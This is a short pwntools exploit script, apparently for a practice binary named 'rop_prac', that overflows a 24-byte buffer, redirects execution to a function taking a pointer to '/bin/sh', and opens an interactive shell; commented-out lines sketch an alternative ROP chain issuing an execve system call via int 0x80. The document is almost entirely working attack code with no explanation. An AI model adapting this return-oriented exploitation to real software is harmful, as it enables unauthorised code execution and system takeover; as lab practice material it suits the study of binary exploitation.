from pwn import *

p = process ("./rop_prac")

pop_eax_ret = 0x080a3ca4
pop_dcb_ret = 0x0806eec1 # pop edx ; pop ecx ; pop ebx ; ret
int_0x80 = 0x08049513
buf = 0x80acacc			#/bin/sh

payload = "a"*24
payload += p32(0x804fb20) + "a"*4 + p32(0x80acacc)
#payload += p32(pop_eax_ret) + p32(0x0b)
#payload += p32(pop_dcb_ret) + p32(0x00) + p32(0x00) + p32(buf)
#payload += p32(int_0x80)


p.sendline(payload)
p.interactive()